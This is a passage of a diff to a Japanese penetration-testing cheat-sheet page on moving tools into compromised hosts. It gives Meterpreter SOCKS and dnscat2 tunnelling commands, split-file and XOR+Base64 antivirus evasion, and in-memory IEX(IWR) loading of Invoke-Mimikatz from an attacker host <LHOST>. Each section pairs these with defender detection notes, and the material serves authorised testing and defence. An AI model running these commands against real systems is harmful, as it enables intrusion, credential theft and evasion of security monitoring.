+          <li>WinRM Copy-Item: PowerShell リモーティングの EID 400/800 + ファイル書込の Sysmon EID 11</li>
+          <li>横展開で到達した先に honeypot アカウント (Canary token) を仕込むと資格情報使用を即検知</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s07" class="reveal">
+      <h2><span class="num">07</span>Proxy &amp; Restricted Egress<span class="jp">プロキシと制限出口</span></h2>
+
+      <h3>07-1. SOCKS プロキシ (proxychains)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Meterpreter: SOCKS プロキシ起動</span>
+msf &gt; use auxiliary/server/socks_proxy
+msf &gt; set VERSION 5
+msf &gt; set SRVPORT 1080
+msf &gt; run -j
+
+<span class="c"># /etc/proxychains4.conf に追記</span>
+<span class="c"># socks5 127.0.0.1 1080</span>
+
+<span class="c"># proxychains 経由で転送</span>
+proxychains -q wget http://10.10.20.10/file
+proxychains -q scp file user@10.10.20.10:/tmp/</code></pre></div>
+
+      <h3>07-2. HTTP プロキシ経由 (Windows)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>$proxy  = New-Object System.Net.WebProxy("http://proxy.corp.com:8080")
+$client = New-Object System.Net.WebClient
+$client.Proxy = $proxy
+$client.DownloadFile("http://<span class="v">&lt;LHOST&gt;</span>/tool.exe", "tool.exe")</code></pre></div>
+
+      <h3>07-3. DNS Tunnel (dnscat2)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Kali: サーバ起動</span>
+ruby dnscat2.rb tunnel.contoso.local</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code><span class="c">:: Windows: クライアント接続</span>
+dnscat2-client.exe tunnel.contoso.local</code></pre></div>
+
+      <div class="note"><span class="lbl">Note</span>DNS tunnel は帯域が UDP/53 に制限 (通常数 KB/s)、大容量ファイル転送には不向き。小さいコマンド実行に最適。</div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>SOCKS: Meterpreter の <code>socks_proxy</code> モジュールは既存 C2 セッションを利用するため direct 検知は困難、ただし接続先 IP への非典型アクセスが SIEM で検出されうる</li>
+          <li>DNS tunnel: 同一ドメインへの短時間大量 TXT / NULL クエリは DNS ログで有意、dnscat2 のクエリパターンは既知シグネチャあり (Suricata / Snort)</li>
+          <li>HTTP proxy 経由: proxy 側にコンテンツ検査 (SSL inspection) がある場合、復号後のペイロードが AV でスキャンされる</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s08" class="reveal">
+      <h2><span class="num">08</span>AV/EDR Evasion Transfers<span class="jp">AV 回避転送</span></h2>
+
+      <h3>08-1. 分割転送 (Split Files)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Kali: 1 MB 単位で分割</span>
+split -b 1048576 tool.exe part_
+ls part_*   <span class="c"># part_aa, part_ab, ...</span>
+python3 -m http.server 8080</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Windows: 各パートを取得して結合</span>
+$parts = "aa","ab","ac"   <span class="c"># 実際のサフィックス列</span>
+$combined = [System.Collections.Generic.List[byte]]::new()
+foreach ($s in $parts) {
+    $data = (iwr "http://<span class="v">&lt;LHOST&gt;</span>:8080/part_$s" -UseBasicParsing).Content
+    $combined.AddRange([byte[]]$data)
+}
+[IO.File]::WriteAllBytes("C:\Windows\Tasks\tool.exe", $combined.ToArray())</code></pre></div>
+
+      <h3>08-2. XOR + Base64 (AV シグネチャ回避)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Kali: XOR エンコード</span>
+python3 -c "
+key = b'<span class="v">&lt;XOR_KEY&gt;</span>'
+data = open('tool.exe','rb').read()
+enc = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
+open('tool.exe.xor','wb').write(enc)
+"
+base64 -w0 tool.exe.xor &gt; tool.b64
+python3 -m http.server 8080</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Windows: デコード</span>
+$key = [Text.Encoding]::ASCII.GetBytes("<span class="v">&lt;XOR_KEY&gt;</span>")
+$enc = [Convert]::FromBase64String((iwr "http://<span class="v">&lt;LHOST&gt;</span>:8080/tool.b64" -UseBasicParsing).Content)
+$dec = for ($i=0; $i -lt $enc.Length; $i++) { $enc[$i] -bxor $key[$i % $key.Length] }
+[IO.File]::WriteAllBytes("C:\Windows\Tasks\tool.exe", $dec)</code></pre></div>
+
+      <h3>08-3. in-memory PS スクリプトロード (ディスク回避)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># PowerShell スクリプトの HTTP ロード・即実行</span>
+IEX(IWR -UseBasicParsing "http://<span class="v">&lt;LHOST&gt;</span>:8080/Invoke-Mimikatz.ps1")
+
+<span class="c"># Base64 エンコード済みスクリプト → デコード後 IEX</span>
+$script = [Convert]::FromBase64String((iwr "http://<span class="v">&lt;LHOST&gt;</span>:8080/script.b64").Content)
+IEX([Text.Encoding]::ASCII.GetString($script))</code></pre></div>
+
+      <h3>08-4. ツール別推奨転送方式</h3>
+      <table>
+        <thead><tr><th>ツール</th><th>検知率</th><th>推奨転送</th></tr></thead>
+        <tbody>
+          <tr><td>mimikatz</td><td>高</td><td>XOR + Base64 → デコード後実行 (または Meterpreter -m)</td></tr>
+          <tr><td>PrintSpoofer / GodPotato</td><td>中</td><td>Base64-over-HTTP で十分</td></tr>
+          <tr><td>SharpHound</td><td>中</td><td>Base64-over-HTTP または IWR DownloadFile</td></tr>
+          <tr><td>ligolo-ng agent</td><td>中</td><td>Defender 無効化後に IWR DownloadFile</td></tr>
+          <tr><td>PowerView / PowerUp</td><td>中</td><td>IEX(IWR) でメモリ直接実行 (AMSI bypass 後)</td></tr>
+          <tr><td>Rubeus</td><td>中〜高</td><td>XOR + Base64 または Meterpreter upload + execute -m</td></tr>
+          <tr><td>linpeas / pspy</td><td>低</td><td>wget / curl で直接</td></tr>
+        </tbody>
+      </table>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>分割転送: 同一 IP への短時間連続 GET (part_aa / part_ab ...) は WAF / NIDS でパターン化</li>
+          <li>XOR + Base64: 転送中は AV スキャンを回避するが、メモリ上で復元した後の実行は ETW-Ti で観測される</li>
+          <li>in-memory: <code>IEX(IWR)</code> は ScriptBlockLogging EID 4104 で URL と内容が記録、<code>[System.Reflection.Assembly]::Load</code> は CLR 内で ETW プロバイダが発火</li>
+          <li>AMSI bypass なしに難読化スクリプトをロードしても、最初のスキャンで検知される可能性が高い</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s09" class="reveal">
+      <h2><span class="num">09</span>Verification &amp; Debug<span class="jp">整合性確認</span></h2>
+      <p>AV による部分削除・転送破損の検出のため、送受信双方でハッシュを確認する。</p>
+
+      <h3>SHA-256 検証</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Kali (送信前)</span>
+sha256sum tool.exe
+md5sum tool.exe</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Windows (受信後)</span>
+Get-FileHash -Algorithm SHA256 "C:\Windows\Tasks\tool.exe"
+Get-FileHash -Algorithm MD5   "C:\Windows\Tasks\tool.exe"</code></pre></div>
+
+      <h3>ファイルサイズ確認</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>ls -la tool.exe</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>(Get-Item "C:\Windows\Tasks\tool.exe").Length</code></pre></div>
+
+      <h3>PE ヘッダ確認 (転送不完全の検出)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># MZ ヘッダの確認</span>
+xxd tool.exe | head -1
+<span class="c"># → 4d5a (MZ) で始まれば PE として正常</span>
+
+file tool.exe
+<span class="c"># → PE32+ executable の場合: 64bit, PE32: 32bit</span></code></pre></div>
+
+      <h3>AV 削除の判別</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># ファイルが存在するが空 or サイズ 0 → AV が中身を削除</span>
+if ((Get-Item "C:\Windows\Tasks\tool.exe").Length -eq 0) { "AV quarantined content" }
+
+<span class="c"># Defender 検疫ログ確認</span>
+Get-MpThreatDetection | Sort-Object InitialDetectionTime -Descending | Select-Object -First 5
+
+<span class="c"># ダウンロード失敗のデバッグ</span>
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+try {
+    $wc.DownloadFile("http://<span class="v">&lt;LHOST&gt;</span>:8080/tool.exe", "C:\Windows\Tasks\tool.exe")
+    "Download succeeded"
+} catch { "Error: $_" }</code></pre></div>
+    </section>
+
+    <section id="s10" class="reveal">
+      <h2><span class="num">10</span>Decision Chart &amp; Key Takeaways<span class="jp">選定チャートと要点</span></h2>
+
+      <h3>転送方法選定チャート</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">text</span><button class="copy">copy</button></div>
+<pre><code>[Q1] AV/EDR の状況は?
+  ├─ 無効 or 除外設定済み → HTTP/SMB 直接転送 (Section 02-1, 02-5)
+  └─ 有効 → [Q2] へ
+
+[Q2] ファイルサイズは?
+  ├─ 1 MB 未満 → Base64-over-HTTP (Section 02-7)
+  ├─ 1-100 MB  → XOR+Base64 or 分割転送 (Section 08-1, 08-2)
+  └─ 100 MB 超 → SMB / FTP / netcat (Section 02-5, 02-9)
+
+[Q3] HTTP egress は通るか?
+  ├─ 通る   → PowerShell IWR (Section 02-1, 02-2)
+  ├─ SMB 可 → impacket smbserver (Section 02-5)
+  ├─ FTP 可 → pyftpdlib (Section 02-9)
+  ├─ プロキシ必須 → SOCKS proxychains (Section 07-1)
+  └─ 全遮断 → DNS tunnel / Base64 コピペ (Section 07-3, 02-6)
+
+[Q4] ターゲット OS は?
+  ├─ Windows → PowerShell IWR / certutil / SMB / Base64
+  ├─ Linux   → wget / curl / SCP / Base64
+  └─ 混在    → HTTP (共通性重視)
+
+[Q5] ディスクへの書込を避けたいか?
+  ├─ はい → IEX(IWR) / Assembly::Load / Meterpreter execute -m (Section 02-7, 02-10, 08-3)
+  └─ いいえ → DownloadFile / certutil / SMB copy</code></pre></div>
+
+      <h3>緊急・制約環境の奇策</h3>
+      <table>
+        <thead><tr><th>状況</th><th>手法</th></tr></thead>
+        <tbody>
+          <tr><td>HTTP / SMB / FTP 全不可</td><td>Base64 コピペ (Meterpreter shell 経由)</td></tr>
+          <tr><td>インタラクティブ shell なし</td><td>レジストリに Base64 格納 → 別セッションで読出</td></tr>
+          <tr><td>WMI イベント経由</td><td><code>Set-WmiInstance ... -Arguments @{Description="BASE64"}</code> → 読出</td></tr>
+          <tr><td>ICMP exfiltration</td><td>icmpsh / nishang Invoke-PowerShellIcmp</td></tr>
+        </tbody>
+      </table>
+
       <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
         <ul>
-          <li>道具は固定パス+venv 隔離で再現性を確保。impacket は版ズレ回避に venv 実体を直呼び。</li>
-          <li>ワンライナは環境変数で持ち、実値の直書きを避ける。これが公開時のサニタイズを楽にする。</li>
-          <li>公開前は grep で実値を機械検査し、コミットは noreply + <code>TZ=UTC</code> を固定。denylist は公開しない。</li>
+          <li>HTTP + PowerShell IWR が最も汎用的 — Windows 標準、プロキシ対応、Base64 対応が一体で使える</li>
+          <li>AV 有効時は転送中のシグネチャ回避に Base64-over-HTTP を使い、メモリ上での実行には Assembly::Load か Meterpreter execute -m を選ぶ</li>
+          <li>SMB は高速で平文転送が目立たないが、FW で port 445 が遮断される環境が多い、impacket-smbserver は認証付きで使うことを推奨</li>
+          <li>certutil は依然使えるが Defender 監視対象のため、AV 無効化後 (evasion 06) または代替手段を使うほうが安全</li>
+          <li>XOR + Base64 は静的シグネチャを回避できるが、メモリ展開後は ETW-Ti で観測される、EDR 有り環境では Direct Syscall + unhook との組合せが前提</li>
+          <li>Meterpreter upload/download は確実だが単一障害点 — セッション切断で全停止するため、重要な転送は並行して HTTP / SMB 経路も確保する</li>
+          <li>転送前後のハッシュ検証を省略しない — AV による部分削除や転送破損は実行時エラーの原因になり、デバッグに時間を取られる</li>
+          <li>横展開時のツール伝播は WinRM Copy-Item (認証済セッション) が最も痕跡が少ない、SMB + sc は EID 7045 で確実に記録される</li>
         </ul>
       </div>
-    </section>
 
-    <section id="ref" class="reveal">
-      <h2><span class="num">05</span>参照<span class="jp">References</span></h2>
+      <h3>References</h3>
       <ul>
-        <li>NetExec — <a href="https://www.netexec.wiki" target="_blank" rel="noopener">netexec.wiki</a></li>
-        <li>ligolo-ng — <a href="https://github.com/nicocha30/ligolo-ng" target="_blank" rel="noopener">github.com/nicocha30/ligolo-ng</a></li>
-        <li>git filter-repo — <a href="https://github.com/newren/git-filter-repo" target="_blank" rel="noopener">github.com/newren/git-filter-repo</a></li>
-        <li>GitHub noreply email — <a href="https://docs.github.com/account-and-profile/setting-up-and-managing-your-personal-account-on-github/managing-email-preferences/setting-your-commit-email-address" target="_blank" rel="noopener">docs.github.com</a></li>
+        <li><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">impacket</a> — smbserver.py / mssqlclient.py 等</li>
+        <li><a href="https://github.com/pyftpdlib/pyftpdlib" target="_blank" rel="noopener">pyftpdlib</a> — Python FTP サーバ</li>
+        <li><a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">dnscat2</a> — DNS tunnel C2</li>
+        <li><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang</a> — PowerShell ベース転送スクリプト集 (Send-File 等)</li>
+        <li><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS Project</a> — certutil / bitsadmin 等の LOLBAS 一覧</li>
+        <li><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a> — Linux LOTL バイナリ一覧</li>
       </ul>
     </section>
+
   </article>
-</div></div>
+</div>
+</div>
 </main>
 
-<footer class="foot"><div class="wrap">
-  <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · Tooling</span></div>
-  <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>github</a></div>
-  <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
-</div></footer>
+<footer class="foot">
+  <div class="wrap">
+    <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · File Transfer &amp; Tooling</span></div>
+    <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>GitHub</a></div>
+    <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
+  </div>
+</footer>
 
 <script src="../content.js"></script>
 <script src="../assets/js/sheet.js"></script>
